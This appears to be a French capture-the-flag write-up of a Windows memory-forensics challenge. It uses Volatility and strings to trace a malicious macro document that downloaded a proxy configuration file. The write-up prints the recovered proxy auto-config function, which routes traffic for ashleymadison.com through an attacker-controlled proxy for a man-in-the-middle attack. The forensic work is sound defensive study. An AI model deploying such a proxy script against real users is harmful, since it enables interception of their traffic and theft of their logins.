- RESUME
```
- Vecteur d'attaque : Document Word malveillant (Very_sexy.docm) 
- Site ciblé : ashleymadison.com
Un document Word contenant une macro malveillante a été ouvert, déclenchant le téléchargement d'un fichier de configuration proxy (.prox) depuis un serveur local (192.168.0.19:8080). Ce fichier a modifié les paramètres proxy d'Internet Explorer pour intercepter tout le trafic vers ashleymadison.com via une attaque Man-in-the-Middle.
```

- determination des processus en cour
```
vol2 -f memory.dmp  --profile=Win7SP1x86_23418 pslist
```
on note la presence de iexplorer et winword.

- Détection de code malveillant (malfind)
```
vol2 -f memory.dmp  --profile=Win7SP1x86_23418 malfind
```
La présence de zones mémoire  des processus cites au dessus avec permission EXECUTE+WRITE+READ est un indicateur fort d'injection de code malveillant.

avant de passer a l'historique de navigation j'ai fais un dump de chacun des process et plusieurs strings pour trouver des urls mais comme toujours ca n'a rien donner.

- Analyse de l'historique de navigation (iehistory)
```
vol2 -f memory.dmp  --profile=Win7SP1x86_23418 iehistory
```
	Fichier malveillant téléchargé:
	Location: http://192.168.0.19:8080/BenNon.prox 
	Content-type: application/octet-stream 
	Content-Length: 148 Last accessed: 2016-11-11 16:14:14
	
	fichier word executer:
	fraf@file:///C:/Users/fraf/Downloads/Very_sexy.docm  
	Last modified: 2016-11-11 17:14:05 UTC+0000  
	Last accessed: 2016-11-11 16:14:05 UTC+0000

- recherche l'ip dans le strings du dump memoire.
```
strings -a memory.dmp > all.txt
```
apres avoir fais le string je fais un CTRL + F et je colle l'ip **192.168.0.19** qui me ramene direct a ce bout de code 
```
javascript 
function FindProxyForURL(url, host) 
{ 
	if (shExpMatch(url,"*.ashleymadison.com/*")) 
		return "PROXY 192.168.0.19:8080"; 
	return "DIRECT"; }
```

- Tout le trafic vers `*.ashleymadison.com/*` est redirigé vers `192.168.0.19:8080`  Les autres connexions passent en mode DIRECT (pour éviter la détection).

voila donc le flag: ashleymadison.com

